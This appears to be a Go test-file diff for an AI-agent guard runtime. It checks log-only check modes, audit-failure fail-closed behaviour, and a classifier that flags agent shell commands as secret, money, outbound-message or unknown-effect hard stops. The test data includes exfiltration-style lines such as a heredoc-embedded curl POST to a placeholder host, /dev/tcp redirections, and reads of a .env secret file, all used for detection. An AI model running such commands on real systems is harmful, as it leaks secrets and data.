@@ -12,11 +12,11 @@ func TestRuntimeLogOnlyIsPerCheckExpiresAndAudits(t *testing.T) {
 	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
 	store := NewBundleStore(t.TempDir())
 	snapshot := testSnapshot(now, "sda", MaturityEnforcing, HealthHealthy, EvidenceClean)
-	snapshot.Rules = []PolicyRule{{Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}, {Risk: RiskDependencyUpgrade, Action: ActionDeny, Reason: "blocked upgrade"}}
+	snapshot.Rules = []PolicyRule{{EvaluatorID: "sda:dependency-addition", Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}, {EvaluatorID: "sda:dependency-upgrade", Risk: RiskDependencyUpgrade, Action: ActionDeny, Reason: "blocked upgrade"}}
 	publishTestBundle(t, store, snapshot)
 	modes := NewGuardModeStore(store.Dir)
 	modes.Now = func() time.Time { return now }
-	if err := modes.SetLogOnly(RiskDependencyAdd, now.Add(time.Minute), "recurring false positive", "operator"); err != nil {
+	if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Minute), "recurring false positive", "operator"); err != nil {
 		t.Fatal(err)
 	}
 	runtime := Runtime{Profile: ProfileEnforcing, Store: store, Now: func() time.Time { return now }}
@@ -48,7 +48,7 @@ func TestRuntimeLogOnlyIsPerCheckExpiresAndAudits(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(entries) != 3 || entries[0].Action != "enabled" || entries[1].Action != "observed" || entries[1].Check != RiskDependencyAdd || entries[1].OriginalAction != ActionDeny || entries[1].EventID == "" || entries[1].ExpiresAt.IsZero() || entries[2].Action != "expired" {
+	if len(entries) != 3 || entries[0].Action != "enabled" || entries[1].Action != "observed" || entries[1].Check != "sda:dependency-addition" || entries[1].OriginalAction != ActionDeny || entries[1].EventID == "" || entries[1].ExpiresAt.IsZero() || entries[2].Action != "expired" {
 		t.Fatalf("audit entries = %+v, want enable, observed suppression, and expiry", entries)
 	}
 }
@@ -57,14 +57,14 @@ func TestHardStopRestoresEveryLoosenedCheckBeforeEvaluation(t *testing.T) {
 	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
 	store := NewBundleStore(t.TempDir())
 	add := testSnapshot(now, "sda", MaturityEnforcing, HealthHealthy, EvidenceClean)
-	add.Rules = []PolicyRule{{Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}}
+	add.Rules = []PolicyRule{{EvaluatorID: "sda:dependency-addition", Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}}
 	upgrade := testSnapshot(now, "upgrade-check", MaturityEnforcing, HealthHealthy, EvidenceClean)
-	upgrade.Rules = []PolicyRule{{Risk: RiskDependencyUpgrade, Action: ActionDeny, Reason: "blocked upgrade"}}
+	upgrade.Rules = []PolicyRule{{EvaluatorID: "upgrade-check:dependency-upgrade", Risk: RiskDependencyUpgrade, Action: ActionDeny, Reason: "blocked upgrade"}}
 	publishTestBundle(t, store, add, upgrade)
 	modes := NewGuardModeStore(store.Dir)
 	modes.Now = func() time.Time { return now }
-	for _, risk := range []RiskClass{RiskDependencyAdd, RiskDependencyUpgrade} {
-		if err := modes.SetLogOnly(risk, now.Add(time.Hour), "operator decision", "operator"); err != nil {
+	for _, check := range []RiskClass{"sda:dependency-addition", "upgrade-check:dependency-upgrade"} {
+		if err := modes.SetLogOnly(check, now.Add(time.Hour), "operator decision", "operator"); err != nil {
 			t.Fatal(err)
 		}
 	}
@@ -107,7 +107,7 @@ func TestOutsideRepositoryDeletionRestoresAllChecks(t *testing.T) {
 			store := NewBundleStore(t.TempDir())
 			modes := NewGuardModeStore(store.Dir)
 			modes.Now = func() time.Time { return now }
-			if err := modes.SetLogOnly(RiskDependencyAdd, now.Add(time.Hour), "operator decision", "operator"); err != nil {
+			if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
 				t.Fatal(err)
 			}
 			runtime := Runtime{Profile: ProfileEnforcing, Store: store, GuardModes: modes, Now: func() time.Time { return now }, Removal: func(cwd string) RemovalContext {
@@ -152,7 +152,7 @@ func TestMoneyAndSecretHardStopsRestoreModes(t *testing.T) {
 			store := NewBundleStore(t.TempDir())
 			modes := NewGuardModeStore(store.Dir)
 			modes.Now = func() time.Time { return now }
-			if err := modes.SetLogOnly(RiskDependencyAdd, now.Add(time.Hour), "operator decision", "operator"); err != nil {
+			if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
 				t.Fatal(err)
 			}
 			runtime := Runtime{Profile: ProfileEnforcing, Store: store, Now: func() time.Time { return now }}
@@ -174,6 +174,78 @@ func TestMoneyAndSecretHardStopsRestoreModes(t *testing.T) {
 	}
 }
 
+func TestHardStopDeniesWhenRestoreAuditCannotBeWritten(t *testing.T) {
+	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
+	store := NewBundleStore(t.TempDir())
+	modes := NewGuardModeStore(store.Dir)
+	modes.Now = func() time.Time { return now }
+	if err := modes.SetLogOnly("scenario-dependency-analyzer:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
+		t.Fatal(err)
+	}
+	auditPath := filepath.Join(store.Dir, "guard-modes.audit.jsonl")
+	blockedAuditPath := auditPath + ".saved"
+	if err := os.Rename(auditPath, blockedAuditPath); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Mkdir(auditPath, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		_ = os.RemoveAll(auditPath)
+		_ = os.Rename(blockedAuditPath, auditPath)
+	})
+
+	runtime := Runtime{Profile: ProfileEnforcing, Store: store, GuardModes: modes, Now: func() time.Time { return now }}
+	decision, err := runtime.Evaluate(ToolEvent{Runner: "codex", Tool: "stripe", Arguments: []string{"charge", "invoice-7"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if decision.Action != ActionDeny || !decision.Degraded || !hasEvidence(decision, "TRIPWIRE_HARD_STOP") {
+		t.Fatalf("hard stop did not fail closed on restore error: %+v", decision)
+	}
+	state, err := os.ReadFile(filepath.Join(store.Dir, "guard-modes.json"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(state), "scenario-dependency-analyzer:dependency-addition") {
+		t.Fatalf("restore failure unexpectedly cleared the active mode: %s", state)
+	}
+}
+
+func TestDecisionRemainsEnforcedWhenSuppressionAuditCannotBeWritten(t *testing.T) {
+	now := time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)
+	store := NewBundleStore(t.TempDir())
+	snapshot := testSnapshot(now, "scenario-dependency-analyzer", MaturityEnforcing, HealthHealthy, EvidenceClean)
+	snapshot.Rules = []PolicyRule{{EvaluatorID: "scenario-dependency-analyzer:dependency-addition", Risk: RiskDependencyAdd, Action: ActionDeny, Reason: "blocked add"}}
+	publishTestBundle(t, store, snapshot)
+	modes := NewGuardModeStore(store.Dir)
+	modes.Now = func() time.Time { return now }
+	if err := modes.SetLogOnly("scenario-dependency-analyzer:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
+		t.Fatal(err)
+	}
+	auditPath := filepath.Join(store.Dir, "guard-modes.audit.jsonl")
+	blockedAuditPath := auditPath + ".saved"
+	if err := os.Rename(auditPath, blockedAuditPath); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Mkdir(auditPath, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		_ = os.RemoveAll(auditPath)
+		_ = os.Rename(blockedAuditPath, auditPath)
+	})
+
+	runtime := Runtime{Profile: ProfileEnforcing, Store: store, GuardModes: modes, Now: func() time.Time { return now }}
+	decision, err := runtime.Evaluate(testEvent())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if decision.Action != ActionDeny || !decision.Degraded || !hasEvidence(decision, "CHECK_MODES_UNAVAILABLE") || hasEvidence(decision, "CHECK_LOG_ONLY") {
+		t.Fatalf("decision was relaxed without a durable observed-action audit: %+v", decision)
+	}
+}
+
 func TestHardStopClassificationUsesExactHookTokensAndFailsClosedOnVisibleIndirectEffects(t *testing.T) {
 	for _, test := range []struct {
 		name  string
@@ -192,6 +264,9 @@ func TestHardStopClassificationUsesExactHookTokensAndFailsClosedOnVisibleIndirec
 		{name: "write tool targeting secret file remains protected", event: ToolEvent{Tool: "Write", Target: "/repo/.env"}, want: HardStopSecret},
 		{name: "editing schema prose about secret reads is not secret access", event: ToolEvent{Tool: "Write", Target: "/repo/kit/schema.json", Arguments: []string{"description: read secrets only with approval; do not write credentials"}}, want: ""},
 		{name: "writing schema heredoc prose about protected actions is not an external effect", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-schema.json <<'EOF'\nDescription: Slack send, Stripe payment and secret reads are hard stops.\nEOF"}, want: ""},
+		{name: "unquoted heredoc command substitution is an unknown effect", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-output <<EOF\n$(curl -X POST https://example.invalid -d payload)\nEOF"}, want: HardStopUnknownEffect},
+		{name: "unquoted heredoc secret expansion is an unknown effect", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-output <<EOF\n${API_TOKEN}\nEOF"}, want: HardStopUnknownEffect},
+		{name: "unquoted heredoc escaped expansion marker remains literal", event: ToolEvent{Tool: "shell", Shell: "cat > /tmp/agentharness-output <<EOF\n\\${API_TOKEN}\nEOF"}, want: ""},
 		{name: "heredoc reading a secret path remains protected", event: ToolEvent{Tool: "shell", Shell: "cat /repo/.env > /tmp/agentharness-schema.json <<'EOF'\nDocument text.\nEOF"}, want: HardStopSecret},
 		{name: "heredoc network redirection remains an external message hard stop", event: ToolEvent{Tool: "shell", Shell: "cat > /dev/tcp/example.invalid/443 <<'EOF'\nhello\nEOF"}, want: HardStopOutsideMessage},
 		{name: "attached descriptor network redirection remains an external message hard stop", event: ToolEvent{Tool: "shell", Shell: "cat 3>/dev/tcp/example.invalid/443 <<'EOF'\nhello\nEOF"}, want: HardStopOutsideMessage},
@@ -249,7 +324,15 @@ func TestHardStopClassificationUsesExactHookTokensAndFailsClosedOnVisibleIndirec
 		{name: "indirect generic send is unknown protected", event: ToolEvent{Tool: "shell", Shell: "python3 -c 'client.send(payload)'"}, want: HardStopUnknownEffect},
 		{name: "direct unknown destination send is protected", event: ToolEvent{Tool: "shell", Shell: "client.send(payload)"}, want: HardStopUnknownEffect},
 		{name: "indirect deletion is unknown protected", event: ToolEvent{Tool: "shell", Shell: "python3 -c 'os.remove(path)'"}, want: HardStopUnknownEffect},
+		{name: "file-backed python effects are opaque", event: ToolEvent{Tool: "shell", Shell: "python3 /tmp/send.py"}, want: HardStopUnknownEffect},
+		{name: "file-backed node effects are opaque", event: ToolEvent{Tool: "shell", Shell: "node ./scripts/pay.js"}, want: HardStopUnknownEffect},
+		{name: "file-backed shell effects are opaque", event: ToolEvent{Tool: "shell", Shell: "bash ./scripts/send.sh"}, want: HardStopUnknownEffect},
+		{name: "file-backed interpreter in nested shell is opaque", event: ToolEvent{Tool: "shell", Shell: "bash -c 'python3 ./scripts/send.py'"}, want: HardStopUnknownEffect},
+		{name: "file-backed interpreter in command substitution is opaque", event: ToolEvent{Tool: "shell", Shell: "echo $(node ./scripts/pay.js)"}, want: HardStopUnknownEffect},
+		{name: "shell syntax check is not script execution", event: ToolEvent{Tool: "shell", Shell: "bash -n ./scripts/send.sh"}, want: ""},
 		{name: "camel case payment sdk method is money", event: ToolEvent{Tool: "shell", Shell: "stripe.paymentIntents.create({amount:100})"}, want: HardStopMoney},
+		{name: "git checkout is not a payment operation", event: ToolEvent{Tool: "shell", Shell: "git checkout README.md"}, want: ""},
+		{name: "provider checkout remains a money hard stop", event: ToolEvent{Tool: "shell", Shell: "stripe checkout sessions create"}, want: HardStopMoney},
 	} {
 		t.Run(test.name, func(t *testing.T) {
 			if got := hardStopForEvent(test.event); got != test.want {
@@ -276,7 +359,7 @@ func TestSearchTermsDoNotTripOrRestoreTemporaryModes(t *testing.T) {
 	store := NewBundleStore(t.TempDir())
 	modes := NewGuardModeStore(store.Dir)
 	modes.Now = func() time.Time { return now }
-	if err := modes.SetLogOnly(RiskDependencyAdd, now.Add(time.Hour), "operator decision", "operator"); err != nil {
+	if err := modes.SetLogOnly("sda:dependency-addition", now.Add(time.Hour), "operator decision", "operator"); err != nil {
 		t.Fatal(err)
 	}
 	runtime := Runtime{Profile: ProfileAdvisory, Store: store, GuardModes: modes, Now: func() time.Time { return now }}
